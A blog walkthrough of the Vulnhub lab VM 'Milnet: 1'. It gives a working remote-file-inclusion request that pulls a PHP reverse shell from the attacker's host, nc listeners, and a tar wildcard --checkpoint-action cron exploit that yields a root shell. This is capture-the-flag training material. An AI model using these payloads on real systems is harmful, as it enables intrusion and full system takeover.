@@ -1,0 +1,376 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Milnet: 1 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Milnet: 1 from Vulnhub Nmap scan result: Nmap scan report for 192.168.0.109
+Host is up, received arp-response (0.00048s latency).
+Scanned at 2016-06- &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2016/06/18/Milnet_1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Milnet: 1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-06-18T18:00:45+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>6:00 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/milnet-1,148/">Milnet: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>Nmap scan result:</p>
+
+<pre><code>Nmap scan report for 192.168.0.109
+Host is up, received arp-response (0.00048s latency).
+Scanned at 2016-06-17 22:09:01 CST for 36s
+Not shown: 998 closed ports
+Reason: 998 resets
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 00:0C:29:E7:D8:D2 (VMware)
+</code></pre>
+
+<h2>Limited Shell</h2>
+
+<p>This machine is running a simple http server on port 80. These files were found after scanning with dirbuster:</p>
+
+<pre><code>File found: /index.php - 200
+File found: /content.php - 200
+File found: /main.php - 200
+File found: /info.php - 200
+File found: /bomb.php - 200
+File found: /props.php - 200
+File found: /info.php - 200
+</code></pre>
+
+<p>Except the <strong>info.php</strong> showed the result of phpinfo(), there is nothing useful in other pages. But something caught my eye. When I was browsing <strong>content.php</strong>, the result is same as <strong>main.php</strong>. So I decided to examine deeper with burpsuite.</p>
+
+<pre><code>POST /content.php HTTP/1.1
+Host: 192.168.0.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.0.109/nav.php
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+route=main
+</code></pre>
+
+<p>When I clicked on the &lsquo;Main&rsquo; button, it was trigged to POST to <strong>content.php</strong> with a parameter <strong>route=main</strong>. And so do the &lsquo;Bomb&rsquo; and the &lsquo;Props&rsquo; buttons.</p>
+
+<p>It seems to be a chance of File Inclusion vulnerability. First I made some attempts for Local File Inclusion. It is okay to use the relative path traversal to get to the file like: <strong>route=../../../../../var/www/html/main</strong>. But all I can do is to include files with <strong>.php</strong> extension. Putting a &lsquo;%00&rsquo; at the end did not help.</p>
+
+<p>Next I tried to include a reverse shell from my machine.</p>
+
+<pre><code>POST /content.php HTTP/1.1
+Host: 192.168.0.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.0.109/nav.php
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+route=http://192.168.0.105/php-reverse-shell.txt?
+</code></pre>
+
+<p>The <strong>.php</strong> problem can be bypassed by putting a &lsquo;?&rsquo; at the end of the line. And this time I got a shell back on my machine.</p>
+
+<pre><code># nc -lvp 6666
+listening on [any] 6666 ...
+192.168.0.109: inverse host lookup failed: Unknown host
+connect to [192.168.0.105] from (UNKNOWN) [192.168.0.109] 50118
+Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ 16:42:41 up  6:39,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+</code></pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>After doing some enumeration, I found a suspicious cron job in <strong>/etc/crontab</strong>.</p>
+
+<pre><code>$ cat /etc/crontab
+---snip---
+# m h dom mon dow user  command
+*/1 *   * * *   root    /backup/backup.sh
+---snip---
+</code></pre>
+
+<p>And here&rsquo;s what <strong>backup.sh</strong> does:</p>
+
+<pre><code>#!/bin/bash
+cd /var/www/html
+tar cf /backup/backup.tgz *
+</code></pre>
+
+<p>It uses the <strong>tar</strong> command to compact the whole directory of <strong>/var/www/html/</strong> every minutes.</p>
+
+<p>And here comes the wildcard exploit again. We have done this before while messing with <a href="../../../../2015/12/23/pipe">PIPE</a>. We can use the same technique to escalate to <strong>root</strong> privilege.</p>
+
+<p>This time I&rsquo;ll use the <strong>php</strong> command to open another php reverse shell.</p>
+
+<p>On milnet:</p>
+
+<pre><code>$ cd /var/www/html
+$ echo &gt; --checkpoint=1
+$ echo &gt; --checkpoint-action=exec=sh\ shell.sh
+$ wget http://192.168.0.105/php-reverse-shell.txt -O prs.php
+--2016-06-18 18:12:37--  http://192.168.0.105/php-reverse-shell.txt
+Connecting to 192.168.0.105:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5495 (5.4K) [text/plain]
+Saving to: 'prs.php'
+
+     0K .....                                                 100%  875M=0s
+
+2016-06-18 18:12:37 (875 MB/s) - 'prs.php' saved [5495/5495]
+
+$ sed -i s/6666/8888/g prs.php
+$ echo 'php prs.php &amp;' &gt; shell.sh
+$ chmod +x shell.sh
+</code></pre>
+
+<p>When the backup.sh is triggered, we&rsquo;ll get the shell pop with <strong>root</strong>.</p>
+
+<pre><code>===
+# nc -lvp 8888
+listening on [any] 8888 ...
+192.168.0.109: inverse host lookup failed: Unknown host
+connect to [192.168.0.105] from (UNKNOWN) [192.168.0.109] 36284
+Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC                                                                                                                                                              2016 x86_64 x86_64 x86_64 GNU/Linux
+ 15:14:02 up  5:10,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# cat /root/credits.txt
+        ,----,
+      ,/   .`|
+    ,`   .'  :  ,---,                          ,---,.
+  ;    ;     /,--.' |                        ,'  .' |                  ,---,
+.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
+|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
+;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
+`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
+    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
+    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
+    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
+    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
+    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
+              `--''       \   \  /         |   | ,'  '---'        \   \  /
+                           `----'          `----'                  `----'
+
+
+This was milnet for #vulnhub by @teh_warriar
+I hope you enjoyed this vm!
+
+If you liked it drop me a line on twitter or in #vulnhub.
+
+I hope you found the clue:
+/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
+I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for                                                                                                                                                              a long time...
+
+This VM was inspired by The Cuckoo's Egg.
+If you have not read it give it a try:
+http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2016-06-18T18:00:45+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>6:00 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2016/06/18/Milnet_1/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2016/06/18/Milnet_1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2016/06/17/stapler_1/" title="Previous Post: Stapler: 1">&laquo; Stapler: 1</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <p><a href="https://facebook.com/newdominic"><img src="/images/facebook.png" width="30" height="30"></a>
+<a href="https://twitter.com/newdominic"><img src="/images/twitter.png" width="30" height="30"></a></p>
+</section>
+<section>
+  <h1>Recent posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/18/Milnet_1/">Milnet: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+  </ul>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
